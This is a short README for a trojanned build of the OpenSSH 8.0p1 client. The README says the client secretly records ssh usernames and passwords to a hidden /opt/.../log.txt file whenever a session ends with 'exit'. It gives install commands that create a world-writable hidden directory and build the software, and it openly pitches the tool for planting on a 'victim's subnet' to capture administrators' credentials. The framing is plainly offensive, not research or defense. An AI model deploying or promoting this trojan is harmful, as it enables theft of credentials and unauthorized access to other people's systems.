# OPENSSH 8 TROJANNED
This is trojanned version of openssh-8.0p1, the ssh client will log ssh username and ssh password into /opt/.../log.txt

# INSTALLATION
<pre>
sudo mkdir -p /opt/...
sudo chmod 777 /opt/...

git clone https://github.com/bluedragonsecurity/openssh8_trojanned.git
cd openssh8_trojanned
./configure
make
sudo make install
</pre>

# WHAT THE HELL IS THIS ?
this trojanned version of openssh is ideal to be installed on a victim's subnet which has many ssh accesses. 
Everytime the administrator using the ssh client, typing password and finish his session using **exit** command, the ssh client will record the username and the password into /opt/.../log.txt.
The "exit" command is the trigger to record the username and the password


